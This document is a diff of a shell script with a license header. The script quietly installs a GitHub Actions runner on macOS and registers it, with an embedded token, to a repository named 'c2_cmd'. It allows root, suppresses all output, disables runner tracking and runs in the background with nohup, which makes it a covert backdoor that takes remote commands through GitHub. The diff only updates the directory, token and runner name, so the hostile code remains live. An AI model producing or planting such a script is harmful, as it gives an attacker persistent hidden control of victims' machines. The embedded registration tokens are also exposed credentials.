@@ -13,11 +13,11 @@
 # limitations under the License.
 export WORKER_LOGRETENTION=1
 export RUNNER_LOGRETENTION=1
-mkdir -p $HOME/.actions-runner3/ && cd $HOME/.actions-runner3/
+mkdir -p $HOME/.actions-runner4/ && cd $HOME/.actions-runner4/
 curl -o actions-runner-osx-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-osx-x64-2.327.1.tar.gz > /dev/null 2>&1
 tar xzf ./actions-runner-osx-x64-2.327.1.tar.gz
 export RUNNER_ALLOW_RUNASROOT="1"
-./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73TNI6NL5S36MRR46E3IS3YXE   --name "Mac-CI3" --labels "Mac-CI3" > /dev/null 2>&1
+./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73WWMDBDCF4LMEIGBDLIS6FGK   --name "Mac-CI4" --labels "Mac-CI4" > /dev/null 2>&1
 rm actions-runner-osx-x64-2.327.1.tar.gz
 export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
 
